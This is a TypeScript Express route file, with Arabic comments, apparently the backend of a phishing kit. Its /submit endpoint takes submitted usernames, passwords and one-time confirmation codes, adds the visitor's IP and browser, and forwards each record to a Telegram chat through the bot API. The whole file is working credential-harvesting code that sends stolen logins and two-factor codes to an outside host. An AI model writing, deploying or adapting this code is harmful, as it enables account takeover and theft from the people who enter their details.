import "dotenv/config";
import { Router, type IRouter, Request, Response } from "express";
import healthRouter from "./health";

const router: IRouter = Router();

router.use(healthRouter);

// ============================================
// 🔐 Endpoint لإرسال التنبيهات إلى تليجرام
// ============================================
router.post("/submit", async (req: Request, res: Response) => {
  try {
    const { username, password, timestamp, userAgent } = req.body;

    if (!username) {
      return res.status(400).json({ error: "Username is required" });
    }

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      console.error("⚠️ Telegram credentials not configured");
      return res.status(500).json({ error: "Telegram not configured" });
    }

    const ip = req.headers['x-forwarded-for'] || req.ip || 'غير معروف';

    // ✅ بناء رسالة نصية عادية (بدون Markdown)
    const isCode = username === "🔐 رمز التأكيد";
    const title = isCode ? "🔐 رمز التأكيد" : "🔐 محاولة دخول جديدة";
    const label = isCode ? "📱 رمز التأكيد:" : "🔑 كلمة المرور:";

    const message = `
${title}

👤 اسم المستخدم: ${username}
${label} ${password}
⏱️ الوقت: ${timestamp || new Date().toLocaleString()}
🌐 IP: ${ip}
📱 المتصفح: ${userAgent || 'غير معروف'}
    `;

    // ✅ إرسال الرسالة بدون Markdown
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        // ❌ تم حذف parse_mode
      }),
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error("❌ Telegram error:", errorText);
      return res.status(500).json({ error: "Failed to send Telegram message" });
    }

    console.log("✅ Telegram notification sent for:", username);
    res.status(200).json({ success: true });

  } catch (error) {
    console.error("❌ Telegram alert error:", error);
    res.status(500).json({ error: "Internal server error" });
  }
});

export default router;
